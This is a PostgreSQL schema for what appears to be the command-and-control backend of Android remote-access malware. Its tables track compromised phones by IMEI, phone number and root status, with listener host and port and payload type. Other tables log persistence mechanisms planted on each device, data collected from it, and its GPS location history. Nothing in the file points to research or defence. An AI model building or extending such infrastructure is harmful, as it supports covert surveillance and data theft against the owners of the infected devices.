-- Railway Persistence Tables
-- Created: 2025-11-22

DROP TABLE IF EXISTS device_locations CASCADE;
DROP TABLE IF EXISTS collected_data CASCADE;
DROP TABLE IF EXISTS persistence_mechanisms CASCADE;
DROP TABLE IF EXISTS session_checkpoints CASCADE;
DROP TABLE IF EXISTS persistent_sessions CASCADE;

CREATE TABLE persistent_sessions (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) UNIQUE NOT NULL,
    device_id VARCHAR(255),
    device_name VARCHAR(255),
    android_version VARCHAR(50),
    manufacturer VARCHAR(100),
    model VARCHAR(100),
    imei VARCHAR(50),
    phone_number VARCHAR(30),
    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    connection_count INTEGER DEFAULT 1,
    lhost VARCHAR(255),
    lport INTEGER,
    payload_type VARCHAR(100),
    is_active BOOLEAN DEFAULT TRUE,
    persistence_level VARCHAR(50),
    root_access BOOLEAN DEFAULT FALSE,
    installed_apps TEXT,
    notes TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE session_checkpoints (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL REFERENCES persistent_sessions(session_uuid) ON DELETE CASCADE,
    checkpoint_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    working_directory TEXT,
    process_id INTEGER,
    process_name VARCHAR(255),
    arch VARCHAR(50),
    privileges TEXT,
    network_info JSONB,
    checkpoint_data JSONB
);

CREATE TABLE persistence_mechanisms (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL REFERENCES persistent_sessions(session_uuid) ON DELETE CASCADE,
    mechanism_type VARCHAR(100) NOT NULL,
    mechanism_name VARCHAR(255),
    installation_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    is_active BOOLEAN DEFAULT TRUE,
    last_verified TIMESTAMP,
    installation_path TEXT,
    configuration JSONB,
    notes TEXT
);

CREATE TABLE collected_data (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL REFERENCES persistent_sessions(session_uuid) ON DELETE CASCADE,
    data_type VARCHAR(100) NOT NULL,
    collection_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    data_size BIGINT,
    file_path TEXT,
    data_content TEXT,
    metadata JSONB,
    is_encrypted BOOLEAN DEFAULT FALSE
);

CREATE TABLE device_locations (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL REFERENCES persistent_sessions(session_uuid) ON DELETE CASCADE,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    latitude DECIMAL(10, 8),
    longitude DECIMAL(11, 8),
    accuracy DECIMAL(10, 2),
    altitude DECIMAL(10, 2),
    provider VARCHAR(50),
    address TEXT
);

CREATE INDEX idx_session_uuid ON persistent_sessions(session_uuid);
CREATE INDEX idx_device_id ON persistent_sessions(device_id);
CREATE INDEX idx_last_seen ON persistent_sessions(last_seen);
CREATE INDEX idx_is_active ON persistent_sessions(is_active);
CREATE INDEX idx_checkpoints_uuid ON session_checkpoints(session_uuid);
CREATE INDEX idx_persistence_uuid ON persistence_mechanisms(session_uuid);
CREATE INDEX idx_collected_uuid ON collected_data(session_uuid);
CREATE INDEX idx_locations_uuid ON device_locations(session_uuid);

CREATE OR REPLACE VIEW v_active_sessions AS
SELECT 
    ps.*,
    COUNT(DISTINCT pm.id) as persistence_count,
    COUNT(DISTINCT cd.id) as collected_data_count,
    MAX(dl.timestamp) as last_location_time,
    COUNT(DISTINCT dl.id) as location_count
FROM persistent_sessions ps
LEFT JOIN persistence_mechanisms pm ON ps.session_uuid = pm.session_uuid AND pm.is_active = TRUE
LEFT JOIN collected_data cd ON ps.session_uuid = cd.session_uuid
LEFT JOIN device_locations dl ON ps.session_uuid = dl.session_uuid
WHERE ps.is_active = TRUE
GROUP BY ps.id;

CREATE OR REPLACE FUNCTION update_session_timestamp()
RETURNS TRIGGER AS $$
BEGIN
    NEW.last_seen = CURRENT_TIMESTAMP;
    NEW.updated_at = CURRENT_TIMESTAMP;
    IF TG_OP = 'UPDATE' THEN
        NEW.connection_count = NEW.connection_count + 1;
    END IF;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER trigger_update_session
    BEFORE UPDATE ON persistent_sessions
    FOR EACH ROW
    EXECUTE FUNCTION update_session_timestamp();

COMMENT ON TABLE persistent_sessions IS 'Tracks persistent sessions';
COMMENT ON TABLE session_checkpoints IS 'Session state checkpoints';
COMMENT ON TABLE persistence_mechanisms IS 'Persistence mechanisms';
COMMENT ON TABLE collected_data IS 'Data collected from devices';
COMMENT ON TABLE device_locations IS 'GPS location history';
